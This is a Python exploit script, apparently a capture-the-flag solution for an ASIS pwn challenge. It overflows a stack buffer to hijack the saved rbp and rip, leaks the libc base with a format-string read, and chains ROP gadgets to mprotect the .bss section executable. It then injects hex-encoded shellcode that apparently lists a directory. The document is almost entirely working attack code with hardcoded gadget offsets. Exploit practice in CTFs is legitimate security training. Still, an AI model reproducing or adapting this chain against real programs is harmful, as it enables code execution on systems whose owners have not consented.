#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
# b *_start+18
b *0x401228
b *perror_internal+13
b *perror_internal+102

b *($base("libc")+0x1ab41b)
b *($base("libc")+0x1ab46b)
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def write(rbx, rbp, rip, trail=b'\n', next_ret=0x1337):
    s(flat(
        0x69420, 0x17386969, # useless (?)
        rbx, # rbx
        rbp, # rbp
        rip, # rip
        next_ret # useless for this
    )[:-1]+trail)


# ==================== EXPLOIT ====================
p = start()

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

sl(flat(
    b'A' * 0x10,
    exe.got.read, # rbx
    exe.bss()+0xe00, # first control rbp and call peror_internal to setup a canary to our bss
) + b'\x11\xaa')

# spray and pray
write(rbx=0, rbp=exe.bss()+0x200, rip=exe.sym._start, next_ret=exe.sym.main)

write(rbx=0, rbp=exe.bss()+0x200, rip=exe.sym._start+18)
write(rbx=0, rbp=exe.bss()+0x200, rip=exe.sym._start+24)
write(rbx=0, rbp=exe.bss()+0x200, rip=exe.sym._start+24)
write(rbx=0, rbp=exe.bss()+0x200, rip=exe.sym._start+24)


sl(flat(
        b'||%2$p||', b'A' * 0x8,
        exe.got.read, # rbx
        exe.bss()+0xe00, # rbp
) + b'\x6a\xaa')

ru(b'||')
libc.address = int(ru(b'||', drop=True), 16) - (libc.sym['read']+17)
slog('libc base @ %#x', libc.address)



sl(flat(
    0, 0,
    0, # rbx
    0, # rbp
    libc.address+0x1ab46b,
    libc.sym.read
)[:-1])


rop = ROP([libc])
rop.rax = exe.bss()+0x500
rop.raw(libc.address+0x1449ba)
rop.raw(7)
rop.mprotect(0x404000, 0x1000)

rop.raw(libc.address+0x1ab46b)
rop.read(0, exe.bss()+0x50)
rop.raw(libc.address+0x1ab41b) # ret
rop.raw(exe.bss()+0x50)

shellcode = bytes.fromhex("488bece81a0000006a3c580f05565755488bec8bf86a02588bf28bd10f05c95f5ec3565755488bec488da42400f0ffff488d053b000000ba0000010033c9e8caffffff8bf8488db500f0ffffb8d9000000ba001000000f0548c7c00100000048c7c7010000004889e648c7c2e80300000f052e000000")
# print(disasm(shellcode))

# shellcode = asm(shellcraft.cat2("./flag-dae7cb7f09d632efcb5289af8d69a0ae.txt"))

# sl(cyclic(200))
s(b'A' * cyclic_find(b'aaan') + rop.chain())

pause()
sl(shellcode)

interactive(flag=False)
# ASIS{Y3t_4n0th3r_p0Ss1biL17y_0f_ROP_wow}
